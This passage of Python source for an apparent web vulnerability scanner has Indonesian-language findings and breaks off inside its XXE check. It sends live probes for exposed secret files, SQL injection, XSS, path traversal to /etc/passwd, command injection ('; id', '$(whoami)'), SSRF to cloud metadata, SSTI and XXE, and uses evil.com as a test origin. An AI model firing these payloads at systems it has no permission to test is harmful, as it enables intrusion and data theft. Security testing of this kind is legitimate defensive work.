    f = FindingList(join(base_url, "/robots.txt"))
    try:
        r = sess.get(join(base_url,"/robots.txt"), timeout=10)
        if r.status_code==200 and "Disallow" in r.text:
            d = re.findall(r"Disallow:\s*(\S+)",r.text,re.I)
            if d:
                warn(f"robots.txt melarang akses ke: {d[:10]}")
                f.append(("INFO","ROBOTS",f"robots.txt berisi {len(d)} aturan Disallow. Path yang diblokir: {d[:8]}. Kadang mengungkap endpoint admin atau path sensitif."))
    except: pass
    return f

def sensitive_files(sess, base_url, ctx=None):
    """Cari file sensitif yang terekspos publik."""
    baseline = ctx.get("baseline") if ctx else None
    if baseline is None:
        baseline = get_baseline_fingerprint(sess, base_url)
        if ctx is not None:
            ctx["baseline"] = baseline

    paths = [("/.env","File env (variabel lingkungan) — bisa berisi database password, API key, secret key aplikasi."),
             ("/.git/config","Konfigurasi Git — ekspos source code dan riwayat commit."),
             ("/.git/HEAD","HEAD Git — konfirmasi repositori Git terekspos."),
             ("/.svn/entries","File SVN — ekspos struktur direktori source code."),
             ("/.htpasswd","File htpasswd — berisi kredensial terenkripsi untuk akses terbatas."),
             ("/dump.sql","Dump database SQL — bisa berisi semua data website."),
             ("/db.sql","File SQL — kemungkinan berisi struktur dan data database."),
             ("/phpinfo.php","phpinfo() — informasi konfigurasi PHP lengkap, termasuk path, variabel lingkungan, dan ekstensi."),
             ("/info.php","phpinfo() — informasi konfigurasi PHP lengkap."),
             ("/wp-config.php","Konfigurasi WordPress — berisi kredensial database, secret keys."),
             ("/config.php","File konfigurasi PHP umum."),
             ("/config.php.bak","Backup file konfigurasi — versi lama mungkin tidak aman."),
             ("/admin/","Halaman admin — panel administrasi website."),
             ("/backup/","Direktori backup — mungkin berisi file sensitif."),
             ("/actuator/health","Spring Boot Actuator health endpoint — informasi kesehatan aplikasi."),
             ("/actuator/info","Spring Boot Actuator info — informasi aplikasi (build, git, env)."),
             ("/swagger-ui.html","Dokumentasi API Swagger — bisa mengungkap endpoint dan parameter API."),
             ("/.env.bak","Backup file env."),
             ("/.env.local","File env local."),
             ("/.env.production","File env production."),
             ("/.env.dev","File env development."),
             ("/storage/logs/laravel.log","Laravel log — bisa berisi stack trace, query, data sensitif.")]

    f = FindingList(); info("Mencari file sensitif...")

    def _is_false_positive(r, path):
        """Cek apakah response adalah SPA catch-all / default page, bukan file asli."""
        if baseline is None or baseline.get("detected") != "spa_catchall":
            return False
        if hash(r.content) == baseline["content_hash"]:
            return True
        if baseline["is_html"] and len(r.content) == baseline["size"]:
            return True
        return False

    def _is_likely_real_env(content):
        """Cek apakah konten benar-benar file .env (bukan HTML page)."""
        text = content[:3000].decode("utf-8", errors="replace")
        keyval_lines = sum(1 for line in text.split("\n") if "=" in line and not line.strip().startswith("#"))
        is_plain = not ("<!" in text[:200] or "<html" in text[:500].lower())
        return is_plain and keyval_lines >= 2

    def _is_likely_real_git_config(content):
        """Cek apakah konten benar-benar .git/config."""
        text = content[:2000].decode("utf-8", errors="replace")
        return "[core]" in text or "repositoryformatversion" in text

    def _is_likely_real_sql_dump(content):
        """Cek apakah konten benar-benar file SQL dump."""
        text = content[:2000].decode("utf-8", errors="replace").lower()
        return any(p in text for p in ["create table", "insert into", "drop table", "create database"])

    def _is_likely_real_phpinfo(content):
        """Cek apakah konten benar-benar hasil phpinfo()."""
        text = content[:2000].decode("utf-8", errors="replace")
        return "phpinfo()" in text or "PHP Version" in text or "php.ini" in text

    def _is_likely_real_admin(content):
        """Cek apakah konten halaman admin (bukan SPA catch-all)."""
        if baseline and baseline.get("detected") == "spa_catchall":
            if hash(content) == baseline["content_hash"]:
                return False
        text = content[:3000].decode("utf-8", errors="replace").lower()
        return any(p in text for p in ["login", "username", "password", "sign in", "dashboard"])

    def _check(item):
        """Periksa satu path. Return (findings, log_lines)."""
        p, desc = item
        out = FindingList(); logs = []
        try:
            r = sess.get(join(base_url, p), timeout=8)
            if r.status_code==200 and len(r.content)>0 and r.url.rstrip("/")!=base_url.rstrip("/"):
                # Skip SPA catch-all
                if _is_false_positive(r, p):
                    logs.append(f"  {p} -> (false positive — SPA catch-all)")
                    return out, logs

                size = len(r.content)

                if any(k in p for k in [".env"]):
                    if _is_likely_real_env(r.content):
                        logs.append(f"!CRIT!File .env terekspos: {p} ({size} bytes)")
                        out.append(("CRITICAL","SENSITIVE_FILE",f"File {p} ({size}B) dapat diakses publik. {desc}", r.url))
                    else:
                        logs.append(f"  {p} -> {size}B (bukan .env asli — konten tidak mengandung KEY=VALUE)")

                elif any(k in p for k in [".git"]):
                    if _is_likely_real_git_config(r.content):
                        logs.append(f"!CRIT!File Git terekspos: {p} ({size} bytes)")
                        out.append(("CRITICAL","SENSITIVE_FILE",f"File {p} ({size}B) dapat diakses publik. {desc}", r.url))
                    else:
                        logs.append(f"  {p} -> {size}B (bukan file Git asli)")

                elif any(k in p for k in ["dump.sql","db.sql"]):
                    if _is_likely_real_sql_dump(r.content):
                        logs.append(f"!CRIT!File SQL terekspos: {p} ({size} bytes)")
                        out.append(("CRITICAL","SENSITIVE_FILE",f"File {p} ({size}B) dapat diakses publik. {desc}", r.url))
                    else:
                        logs.append(f"  {p} -> {size}B (bukan SQL dump asli)")

                elif ".svn" in p:
                    logs.append(f"!CRIT!File SVN terekspos: {p} ({size} bytes)")
                    out.append(("CRITICAL","SENSITIVE_FILE",f"File {p} ({size}B) dapat diakses publik. {desc}", r.url))

                elif ".htpasswd" in p:
                    logs.append(f"!CRIT!File htpasswd terekspos: {p} ({size} bytes)")
                    out.append(("CRITICAL","SENSITIVE_FILE",f"File {p} ({size}B) dapat diakses publik. {desc}", r.url))

                elif "phpinfo" in p or "info.php" in p:
                    if _is_likely_real_phpinfo(r.content):
                        logs.append(f"!CRIT!PHP info publik: {p} ({size} bytes)")
                        out.append(("HIGH","PHP_INFO",f"File {p} ({size}B) mengekspos konfigurasi PHP lengkap. {desc}", r.url))
                    else:
                        logs.append(f"  {p} -> {size}B (bukan phpinfo asli)")

                elif p in ("/admin/", "/backup/"):
                    if _is_likely_real_admin(r.content):
                        logs.append(f"!WARN!Halaman admin/backup: {p} ({size} bytes)")
                        out.append(("MEDIUM","SENSITIVE_FILE",f"File {p} ({size}B) dapat diakses publik. {desc}", r.url))
                    else:
                        logs.append(f"  {p} -> {size}B (SPA catch-all, bukan halaman admin asli)")

                elif "actuator" in p:
                    logs.append(f"!WARN!Actuator endpoint publik: {p} ({size} bytes)")
                    out.append(("MEDIUM","SENSITIVE_FILE",f"File {p} ({size}B) dapat diakses publik. {desc}", r.url))

                else:
                    # Generic check dengan baseline
                    logs.append(f"!WARN!File terakses: {p} ({size} bytes)")
                    out.append(("MEDIUM","SENSITIVE_FILE",f"File {p} ({size}B) dapat diakses publik. {desc}", r.url))

            elif r.status_code==403:
                logs.append(f"{p} -> 403 (terproteksi)")
        except: pass
        return out, logs

    results = pmap(_check, paths)
    for out, logs in results:
        f.extend(out)
        for line in logs:
            if line.startswith("!CRIT!"): critical(line[6:])
            elif line.startswith("!WARN!"): warn(line[6:])
            else: info(line)
    return f

def dir_listing(sess, base_url, ctx=None):
    """Cek directory listing."""
    dirs = [("/images/","direktori gambar"),("/uploads/","direktori upload"),("/backup/","direktori backup"),
            ("/admin/","direktori admin"),("/assets/","direktori assets"),("/files/","direktori file"),
            ("/css/","direktori CSS"),("/js/","direktori JS")]
    f = FindingList(); info("Mengecek directory listing...")
    baseline = ctx.get("baseline") if ctx else None

    def _check(item):
        d, label = item
        out = FindingList()
        try:
            r = sess.get(join(base_url, d), timeout=8)
            if r.status_code==200:
                # Skip SPA catch-all
                if baseline and baseline.get("detected") == "spa_catchall":
                    if hash(r.content) == baseline["content_hash"]:
                        return out
                    if baseline["is_html"] and len(r.content) == baseline["size"]:
                        return out
                t = r.text.lower()
                if "index of" in t or "parent directory" in t:
                    out.append(("HIGH","DIR_LISTING",f"Direktori {d} mengaktifkan directory listing. Siapa pun bisa melihat daftar lengkap file di direktori ini, termasuk file non-publik.", r.url))
        except: pass
        return out

    for out in pmap(_check, dirs):
        for item in out:
            critical(f"Directory listing aktif: {urllib.parse.urlparse(item[3] or '').path}")
            f.append(item)
    return f

def http_methods(sess, base_url, ctx=None):
    f = FindingList(); info("Memeriksa metode HTTP...")
    def _check(m):
        out = FindingList()
        try:
            r = sess.request(m, base_url, timeout=8)
            # Bukti diambil per metode: TRACE/OPTIONS menembak URL yang sama,
            # jadi lookup longgar bisa menempelkan respons metode lain.
            proof = evidence_for(r.url, m)
            if m=="OPTIONS":
                a = r.headers.get("Allow","")
                if a and ("PUT" in a.upper() or "DELETE" in a.upper()):
                    out.append(("HIGH","HTTP_METHOD",f"Server mengizinkan metode PUT/DELETE: {a}. PUT bisa dipakai unggah file berbahaya, DELETE bisa hapus resource.", None),
                               evidence=proof)
            if m=="TRACE" and r.status_code==200:
                out.append(("MEDIUM","TRACE_ENABLED","Metode HTTP TRACE aktif. Bisa dieksploitasi untuk Cross-Site Tracing (XST) — mencuri cookie HttpOnly via JavaScript.", None),
                           evidence=proof)
        except: pass
        return out

    results = pmap(_check, ["PUT","DELETE","TRACE","OPTIONS"])
    for out in results:
        for item in out:
            if item[1] == "HTTP_METHOD":
                critical("Metode berbahaya diizinkan di target")
            else:
                critical("Metode TRACE aktif")
            f.append(item)
    return f

def cors_check(sess, base_url, ctx=None):
    f = FindingList(base_url)
    try:
        r = sess.get(base_url, headers={"Origin":"https://evil.com","Host":host_from_url(base_url)}, timeout=10)
        acao = r.headers.get("Access-Control-Allow-Origin")
        acac = r.headers.get("Access-Control-Allow-Credentials")
        if acao=="*" and acac=="true":
            critical("CORS: Access-Control-Allow-Origin: * dengan Allow-Credentials: true")
            f.append(("HIGH","CORS_WILDCARD_CRED","CORS dikonfigurasi dengan Access-Control-Allow-Origin: * DAN Access-Control-Allow-Credentials: true. Ini memungkinkan situs jahat membaca respons yang memuat kredensial pengguna (cookie, token) via JavaScript."))
        elif acao=="https://evil.com":
            warn("CORS: Access-Control-Allow-Origin mencerminkan origin permintaan")
            f.append(("MEDIUM","CORS_REFLECT","CORS mengembalikan nilai Access-Control-Allow-Origin yang sama dengan origin permintaan. Attacker bisa membuat halaman yang membaca data dari situs ini via JavaScript."))
        elif acao=="*":
            warn("CORS: semua origin diizinkan")
            f.append(("MEDIUM","CORS_WILDCARD","Access-Control-Allow-Origin: *. Semua situs bisa membaca respons via JavaScript. Risiko kebocoran data."))
    except: pass
    return f

def tls_ssl(sess, base_url, ctx=None):
    # Pemeriksaan TLS memakai socket, bukan HTTP: tidak ada exchange untuk dijadikan bukti.
    f = FindingList(capture=False); host = host_from_url(base_url)
    if scheme_from_url(base_url)!="https": return f
    info("Memeriksa TLS/SSL...")
    try:
        ctx = ssl.create_default_context(); ctx.check_hostname=True; ctx.verify_mode=ssl.CERT_REQUIRED
        with socket.create_connection((host,443),timeout=10) as sock:
            with ctx.wrap_socket(sock,server_hostname=host) as ss:
                cert = ss.getpeercert()
                if cert:
                    nb = cert.get("notBefore",""); na = cert.get("notAfter","")
                    good(f"Sertifikat berlaku: {nb} s.d. {na}")
                    try:
                        exp = datetime.strptime(na, "%b %d %H:%M:%S %Y %Z")
                        days = (exp - datetime.now()).days
                        if days<30:
                            critical(f"Sertifikat akan kedaluwarsa dalam {days} hari!")
                            f.append(("HIGH","TLS_EXPIRING",f"Sertifikat SSL/TLS kedaluwarsa dalam {days} hari. Browser akan menampilkan peringatan keamanan kepada pengunjung setelah kedaluwarsa."))
                        elif days<90:
                            warn(f"Sertifikat akan kedaluwarsa dalam {days} hari")
                            f.append(("MEDIUM","TLS_EXP_SOON",f"Sertifikat SSL/TLS kedaluwarsa dalam {days} hari. Perpanjang segera untuk menghindari gangguan."))
                        else: good(f"Sertifikat berlaku {days} hari lagi")
                    except: pass
    except ssl.SSLCertVerificationError as e:
        warn(f"SSL cert: {e}")
        f.append(("HIGH","TLS_CERT_ERR",f"Verifikasi sertifikat gagal: {e}. Pengunjung akan melihat peringatan keamanan."))
    except Exception as e:
        warn(f"TLS error: {e}")
    for pn,pv in [("TLSv1.0",ssl.TLSVersion.TLSv1),("TLSv1.1",ssl.TLSVersion.TLSv1_1)]:
        try:
            ctx2 = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT); ctx2.minimum_version=pv; ctx2.maximum_version=pv
            ctx2.check_hostname=False; ctx2.verify_mode=ssl.CERT_NONE
            with socket.create_connection((host,443),timeout=5) as sock:
                with ctx2.wrap_socket(sock,server_hostname=host) as _:
                    critical(f"Protokol usang didukung: {pn}")
                    f.append(("HIGH",f"WEAK_{pn.replace('.','_')}",f"Server mendukung {pn}. Protokol ini sudah tidak aman dan rentan terhadap serangan seperti POODLE, BEAST. Nonaktifkan dan gunakan minimal TLSv1.2."))
        except: pass
    return f

def scan_sqli(sess, base_url, ctx=None):
    f = FindingList(); info("Menguji SQL injection...")
    if echo_skip(sess, base_url, ctx):
        info("  (dilewati: endpoint memantulkan input)")
        return f
    forms = get_forms(ctx)
    payloads = [("'","petik tunggal"),("' OR '1'='1","OR true"),("' OR 1=1--","OR true komentar"),
                ("' UNION SELECT NULL--","UNION"),("' AND SLEEP(3)--","time-based")]
    errs = ["sql","mysql","syntax error","unclosed quotation","odbc","driver","warning: mysql","pg_query","sqlite","ora-"]
    tested = [0]
    # Cek URL params
    def _check_url(job):
        url, p = job
        for payload, label in payloads:
            try:
                r = sess.get(url, params={p: payload}, timeout=10)
                if any(e in r.text.lower() for e in errs) and len(r.text)<50000:
                    return [("HIGH","SQLI",f"Parameter URL '{p}' rentan SQL injection (error-based, payload: {label}). Attacker bisa membaca/mengubah database. URL: {url}?{p}={payload[:30]}", f"{url}?{p}={payload[:30]}", f"SQL injection via parameter '{p}' dengan payload '{label}'")]
            except: pass
        return []
    # Parameter hasil panen spesifikasi API (kalau modul apispec jalan) ikut diuji,
    # ditambah parameter nyata dari URL historis/JS hasil recon (berbatas).
    url_params = list(dict.fromkeys(["id","page","p","q","cat","user","uid"] + spec_injection_targets(ctx)))
    out = pmap_until(_check_url, [(u, p) for u, job_params in injection_url_jobs(ctx, base_url)
                                  for p in (job_params if job_params is not None else url_params)])
    if out:
        for sev, code, desc, url, msg in out:
            critical(msg)
            f.append((sev, code, desc, url))
    # Cek form params
    def _check_form(job):
        action, method, inputs, page, inp = job
        # List biasa: tuple di sini membawa pesan log ke-5 yang tidak dipakai Finding.
        out = []
        for payload, label in payloads:
            try:
                p = {inp["name"]: payload}
                url = join(base_url, action)
                r = sess.get(url, params=p, timeout=10) if method=="GET" else sess.post(url, data=p, timeout=10)
                if any(e in r.text.lower() for e in errs) and len(r.text)<50000:
                    out.append(("HIGH","SQLI",f"Form field '{inp['name']}' di {action} rentan SQL injection (error-based, payload: {label}). Attacker bisa membaca/mengubah database.", action, f"SQL injection via field '{inp['name']}' di form {action}"))
                    break
            except: pass
        return out
    jobs = []
    for action,method,inputs,page in forms:
        for inp in inputs:
            if inp["type"] in ("text","search","textarea","hidden","") and inp["name"]:
                jobs.append((action, method, inputs, page, inp))
    tested[0] = len(jobs)
    if jobs:
        out = pmap_until(_check_form, jobs)
        if out:
            for sev, code, desc, url, msg in out:
                critical(msg)
                f.append((sev, code, desc, url), evidence_url=url)
    info(f"SQLi: {tested[0]} parameter diuji")
    return f

def scan_xss(sess, base_url, ctx=None):
    f = FindingList(); info("Menguji XSS...")
    payloads = [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        '"><script>alert(1)</script>',
        "javascript:alert(1)",
    ]
    params = list(dict.fromkeys(["q","s","search","query","id","page","name","text","term","keyword","msg","message","subject","comment"]
                                + spec_injection_targets(ctx)))
    
    # ── Reflected XSS via GET ──
    def _check_get(job):
        url, p, payload = job
        try:
            r = sess.get(url, params={p: payload}, timeout=10)
            if payload in r.text:
                return [("HIGH","XSS_REFLECTED",f"Parameter '{p}' memantulkan tag script mentah — reflected XSS. Attacker bisa menjalankan JavaScript di browser korban. URL: {r.url}", r.url, f"XSS terdeteksi di parameter '{p}' (GET)")]
        except: pass
        return []
    xss_jobs = [(u, p) for u, job_params in injection_url_jobs(ctx, base_url)
                for p in (job_params if job_params is not None else params)]
    out = pmap_until(_check_get, [(u, p, pl) for pl in payloads for u, p in xss_jobs])
    if out:
        for sev, code, desc, url, msg in out:
            critical(msg)
            f.append((sev, code, desc, url))

    # ── XSS via form POST (dari crawler) ──
    crawler = ctx.get("crawler") if ctx else None
    if crawler:
        forms = get_forms(ctx)
        def _check_post(job):
            action, inputs, page, payload = job
            text_inputs = [i for i in inputs if i["type"] in ("text","search","textarea","") and i["name"]]
            if not text_inputs: return []
            data = {i["name"]: payload for i in inputs if i["name"]}
            try:
                r = sess.post(action, data=data, timeout=10)
                if payload in r.text:
                    return [("HIGH","XSS_POST",f"Form POST di {page} (action: {action}) rentan XSS. Field {text_inputs[0]['name']} memantulkan payload JavaScript. Attacker bisa mengirim link ke korban yang mengeksekusi script di browser mereka.", action, f"XSS terdeteksi via POST form {action}")]
            except: pass
            return []
        jobs = []
        for action,method,inputs,page in forms:
            if method.upper() != "POST": continue
            for payload in payloads:
                jobs.append((action, inputs, page, payload))
        if jobs:
            out = pmap_until(_check_post, jobs)
            if out:
                for sev, code, desc, url, msg in out:
                    critical(msg)
                    f.append((sev, code, desc, url))
        
        # ── Stored XSS — submit lalu cek halaman lain ──
        if not any("XSS" in x[0] for x in f):
            for action,method,inputs,page in forms:
                if method.upper() != "POST": continue
                text_inputs = [i for i in inputs if i["type"] in ("text","search","textarea","") and i["name"]]
                if not text_inputs: continue
                # Coba payload di field pertama aja
                payload = "<img src=x onerror=alert(1)>"
                data = {}
                for i in inputs:
                    if i["name"]: data[i["name"]] = payload if i == text_inputs[0] else "test"
                try:
                    sess.post(action, data=data, timeout=10)
                    # Cek beberapa halaman setelah submit apakah payload muncul
                    for pg_url, pg_html in list(crawler.pages.items())[:5]:
                        if pg_url != page and payload in pg_html:
                            critical(f"Stored XSS: payload muncul di {pg_url}")
                            f.append(("HIGH","XSS_STORED",f"Data dari form di {page} disimpan dan ditampilkan mentah di {pg_url}. Attacker bisa menyuntikkan JavaScript yang dijalankan setiap kali pengguna lain membuka halaman tersebut."))
                            break
                except: pass
    return f

def open_redirect(sess, base_url, ctx=None):
    f = FindingList(); info("Menguji open redirect...")
    redirect_params = ["next","redirect","url","return","to","dest","goto"]
    def _check(job):
        url, param = job
        try:
            r = sess.get(url, params={param: "https://evil.com"}, timeout=10, allow_redirects=False)
            if r.status_code in (301,302,303,307,308) and "evil.com" in r.headers.get("Location",""):
                return [("HIGH","OPEN_REDIRECT",f"Parameter '{param}' di {url} mengarahkan browser ke URL eksternal tanpa validasi. Attacker bisa memanfaatkan ini untuk phishing (mengelabui korban mengklik link yang mengarah ke situs jahat).", r.url, f"Open redirect via parameter '{param}'")]
        except: pass
        return []
    out = pmap_until(_check, [(u, p)
                              for u, job_params in injection_url_jobs(ctx, base_url)
                              for p in (job_params if job_params is not None else redirect_params)])
    if out:
        for sev, code, desc, url, msg in out:
            critical(msg)
            f.append((sev, code, desc, url))
    return f

def lfi_check(sess, base_url, ctx=None):
    f = FindingList(); info("Menguji LFI / path traversal...")
    if echo_skip(sess, base_url, ctx):
        info("  (dilewati: endpoint memantulkan input)")
        return f
    def _check(job):
        url, param, payload = job
        try:
            r = sess.get(url, params={param: payload}, timeout=10)
            body = r.text.lower()
            if ("root:" in body or "daemon:" in body):
                if "../../etc/passwd" not in r.text.lower()[:500]:
                    return [("HIGH","LFI",f"Parameter '{param}' di {url} memungkinkan pembacaan file server (path traversal). Attacker bisa membaca /etc/passwd dan file sensitif lainnya. Payload: {payload}", r.url, f"LFI terdeteksi via parameter '{param}'")]
        except: pass
        return []
    lfi_params = list(dict.fromkeys(["file","page","include","path","doc","load"] + spec_injection_targets(ctx)))
    out = pmap_until(_check, [(u, p, pl) for u, job_params in injection_url_jobs(ctx, base_url)
                              for p in (job_params if job_params is not None else lfi_params)
                              for pl in ["../../etc/passwd","../../etc/hosts"]])
    if out:
        for sev, code, desc, url, msg in out:
            critical(msg)
            f.append((sev, code, desc, url))
    return f

def cmd_injection(sess, base_url, ctx=None):
    f = FindingList(); info("Menguji command injection...")
    if echo_skip(sess, base_url, ctx):
        info("  (dilewati: endpoint memantulkan input)")
        return f
    
    cmd_params = ["cmd","command","exec","ping","host","domain","ip","target","hostname"]
    cmd_payloads = [("; id","titik koma + id"),("| id","pipe + id"),("`id`","backtick"),("$(whoami)","subshell")]
    
    # ── Cek GET params ──
    def _check_get(job):
        path, param, payload, label = job
        try:
            r = sess.get(join(base_url, path), params={param: payload}, timeout=10)
            body = r.text
            if ("uid=" in body or "gid=" in body) and not any(x in body for x in ["whoami","id","git"]):
                return [("HIGH","CMD_INJECTION",f"Command injection di {path} via parameter '{param}' (GET). Payload: {label}. Attacker bisa menjalankan perintah shell di server dengan hak akses web server.", r.url, f"Command injection di {path} via '{param}' (GET)")]
        except: pass
        return []
    jobs = [(path, param, payload, label)
            for path in ["/","/ping","/exec","/cmd","/run","/api/exec"]
            for payload, label in cmd_payloads
            for param in cmd_params]
    out = pmap_until(_check_get, jobs)
    if out:
        for sev, code, desc, url, msg in out:
            critical(msg)
            f.append((sev, code, desc, url))
        f.extend(scan_oob_cmdi(sess, base_url, ctx))
        return f
    
    # ── Cek POST form ──
    crawler = ctx.get("crawler") if ctx else None
    if crawler:
        forms = get_forms(ctx)
        def _check_post(job):
            action, inputs, page, payload, label, field = job
            data = {}
            for i in inputs:
                if i["name"]:
                    data[i["name"]] = payload if i["name"] == field else "test"
            try:
                r = sess.post(action, data=data, timeout=10)
                body = r.text
                if ("uid=" in body or "gid=" in body) and not any(x in body for x in ["whoami","id","git"]):
                    return [("HIGH","CMD_INJECTION_POST",f"Form POST di {page} (action: {action}) rentan command injection via field '{field}' dengan payload {label}. Attacker bisa menjalankan perintah shell di server.", action, f"Command injection via POST form {action} (field: {field})")]
            except: pass
            return []
        jobs = []
        for action,method,inputs,page in forms:
            if method.upper() != "POST": continue
            text_inputs = [i for i in inputs if i["type"] in ("text","search","textarea","") and i["name"]]
            if not text_inputs: continue
            for payload,label in cmd_payloads:
                jobs.append((action, inputs, page, payload, label, text_inputs[0]["name"]))
        out = pmap_until(_check_post, jobs)
        if out:
            for sev, code, desc, url, msg in out:
                critical(msg)
                f.append((sev, code, desc, url))
            f.extend(scan_oob_cmdi(sess, base_url, ctx))
            return f
    # Blind CMDi (tanpa output di respons) hanya terbukti lewat callback OOB.
    f.extend(scan_oob_cmdi(sess, base_url, ctx))
    return f

def ssrf_check(sess, base_url, ctx=None):
    f = FindingList(); info("Menguji SSRF...")
    ssrf_url = "http://169.254.169.254/"
    ssrf_payloads = ["url","uri","link","href","src","ref","reference","callback","redirect","return","next","path","file","document","image","img","target"]
    
    # ── Cek endpoint umum via GET ──
    def _check_get(job):
        path, param = job
        try:
            target = join(base_url, path)
            r = sess.get(target, params={param:ssrf_url}, timeout=10)
            if r.status_code in (200,301,302) and len(r.content)>10:
                return [("MEDIUM","SSRF",f"Endpoint {path} dengan parameter '{param}' menerima URL eksternal dan merespons. Jika server memproses URL internal (seperti 169.254.169.254 untuk metadata AWS/GCP), attacker bisa mencuri kredensial cloud.", r.url, f"Kemungkinan SSRF: {path}?{param}=...")]
        except: pass
        return []
    jobs = [(path, param)
            for path in ["/proxy","/fetch","/curl","/api/proxy","/api/fetch","/api/url","/fetch-url","/proxy?url="]
            for param in ["url","uri","target"]]
    out = pmap_until(_check_get, jobs)
    if out:
        for sev, code, desc, url, msg in out:
            warn(msg)
            f.append((sev, code, desc, url))
    
    # ── SSRF via form POST (crawler) ──
    crawler = ctx.get("crawler") if ctx else None
    if crawler:
        forms = get_forms(ctx)
        def _check_post(job):
            action, inputs, page, url_field = job
            data = {}
            for i in inputs:
                if i["name"]:
                    data[i["name"]] = ssrf_url if i["name"] == url_field else "test"
            # List biasa: tuple di sini membawa pesan log ke-5 yang tidak dipakai Finding.
            out = []
            try:
                r = sess.post(action, data=data, timeout=10)
                if "169.254.169.254" in r.text or len(r.content) > 1000:
                    out.append(("MEDIUM","SSRF_FORM",f"Form POST di {page} (action: {action}) memiliki field '{url_field}' yang mungkin diproses server sebagai URL. Attacker bisa memanfaatkan ini untuk SSRF — membaca metadata cloud internal atau memindai port jaringan internal.", action, f"Kemungkinan SSRF via form field '{url_field}' di {action}"))
                elif "timed out" in r.text.lower() or "connection refused" in r.text.lower() or "couldn't connect" in r.text.lower():
                    out.append(("LOW","SSRF_TIMEOUT",f"Field '{url_field}' di form {action} menyebabkan timeout/connection error saat dikirim URL eksternal — indikasi server mencoba mengakses URL tersebut.", action, f"SSRF indikasi: field '{url_field}' di {action} mencoba fetch URL (error timeout)"))
            except: pass
            return out
        jobs = []
        for action,method,inputs,page in forms:
            if method.upper() != "POST": continue
            url_fields = [i for i in inputs if i["name"] and any(kw in i["name"].lower() for kw in ssrf_payloads)]
            if not url_fields: continue
            jobs.append((action, inputs, page, url_fields[0]["name"]))
        out = pmap_until(_check_post, jobs)
        if out:
            for sev, code, desc, url, msg in out:
                warn(msg)
                f.append((sev, code, desc, url), evidence_url=url)
    # Blind SSRF hanya bisa dibuktikan lewat callback OOB (butuh --oob-host).
    f.extend(scan_oob_ssrf(sess, base_url, ctx))
    return f

def rate_limit(sess, base_url, ctx=None):
    f = FindingList(base_url); info("Menguji rate limiting...")
    def _probe(_):
        try:
            r = sess.get(base_url, timeout=8)
            return r.status_code
        except: pass
        return None
    statuses = pmap(_probe, list(range(15)))
    if 429 in statuses:
        good("Rate limiting aktif (HTTP 429)")
        f.append(("INFO","RATE_LIMIT","Rate limiting aktif — server mengembalikan HTTP 429 setelah beberapa permintaan cepat. Melindungi dari brute force."))
    else:
        warn("Tidak ada rate limiting")
        f.append(("LOW","NO_RATE_LIMIT","Tidak ada rate limiting — server tidak memblokir permintaan berulang (tidak ada HTTP 429 setelah 15 permintaan cepat). Rentan brute force login, credential stuffing."))
    return f

# ── DETAILED modules ──

def scan_ssti(sess, base_url, ctx=None):
    f = FindingList(); info("Menguji SSTI (Server-Side Template Injection)...")
    if echo_skip(sess, base_url, ctx):
        info("  (dilewati: endpoint memantulkan input)")
        return f
    crawler = ctx.get("crawler") if ctx else None
    params = [("q",False),("name",False),("search",False),("user",False)]
    if crawler:
        for a,m,inps,p in get_forms(ctx):
            for i in inps:
                if i["type"] in ("text","search","textarea","") and i["name"]: params.append((i["name"],True))
    tests = [("{{7*7}}","49","Jinja2/Twig"),("{{7*'7'}}","7777777","Jinja2"),("${7*7}","49","Freemarker")]
    def _check(job):
        param, payload, expected, engine = job
        try:
            r = sess.get(base_url, params={param: payload}, timeout=10)
            if expected.lower() in r.text and payload.lower() not in r.text:
                return [("HIGH","SSTI",f"Parameter '{param}' di {base_url} rentan Server-Side Template Injection (engine: {engine}). Payload '{payload}' dieksekusi server menjadi '{expected}'. Attacker bisa menjalankan kode remote (RCE), membaca file, atau mengakses variabel lingkungan server.", r.url, f"SSTI terdeteksi: '{param}' menggunakan engine {engine}")]
        except: pass
        return []
    jobs = [(param, payload, expected, engine) for param, _ in params for payload, expected, engine in tests]
    out = pmap_until(_check, jobs)
    if out:
        for sev, code, desc, url, msg in out:
            critical(msg)
            f.append((sev, code, desc, url))
        return f
    return f

def scan_xxe(sess, base_url, ctx=None):
    f = FindingList(); info("Menguji XXE (XML External Entity)...")
    
    # Payload XXE — baca /etc/passwd via entity eksternal
    xxe_payloads = [
        '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><r>&xxe;</r>',
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
    ]
    
    # ── Kirim langsung ke endpoint umum dengan Content-Type XML ──
    xxe_paths = ["/api/xml","/xml","/soap","/api/soap","/api/upload","/ws","/api/ws"]
    def _check_direct(job):
        url, payload = job
        try:
            r = sess.post(url, data=payload, headers={"Content-Type": "application/xml"}, timeout=10)
            body = r.text.lower()
            if "root:" in body and ":" in body and "/bin/bash" in body:
                return [("HIGH","XXE_DIRECT",f"XXE di {url}: payload XML mentah berhasil membaca /etc/passwd. Attacker bisa membaca file server (konfigurasi, kredensial, source code), melakukan SSRF ke jaringan internal, atau denial of service (Billion Laughs).", url, f"XXE terdeteksi di {url}")]
        except: pass
        return []
    jobs = [(join(base_url, path), payload) for path in xxe_paths for payload in xxe_payloads]
    out = pmap_until(_check_direct, jobs)
    if out:
        for sev, code, desc, url, msg in out:
            critical(msg)
            f.append((sev, code, desc, url))
        f.extend(scan_oob_xxe(sess, base_url, ctx))
        return f
    
    # ── XXE via form POST ──
    crawler = ctx.get("crawler") if ctx else None
    if crawler:
        forms = get_forms(ctx)
        def _check_form(job):
            action, inputs, page, payload = job
            data = {}
            for i in inputs:
                if i["name"]:
                    if "xml" in i["name"].lower():
                        data[i["name"]] = payload
                    else:
                        data[i["name"]] = "test"
            try:
                r = sess.post(join(base_url, action), data=data, timeout=10)
                body = r.text.lower()
                if "root:" in body and ":" in body and "/bin/bash" in body:
                    return [("HIGH","XXE_FORM",f"XXE di form {page} (action: {action}): field XML menerima entity eksternal dan mengeksekusi pembacaan file. Attacker bisa membaca file server sensitif.", action, f"XXE terdeteksi via form {action}")]
            except: pass
            return []
        jobs = []
        for action,method,inputs,page in forms:
            if method.upper() != "POST": continue
            types = {i["type"] for i in inputs}
            text_inputs = [i for i in inputs if i["name"]]
            # Cari form yg punya field "xml" atau file upload
            has_xml_field = any("xml" in i["name"].lower() for i in text_inputs)
            if not has_xml_field and "file" not in types: continue
            for payload in xxe_payloads:
                jobs.append((action, inputs, page, payload))
        out = pmap_until(_check_form, jobs)
        if out:
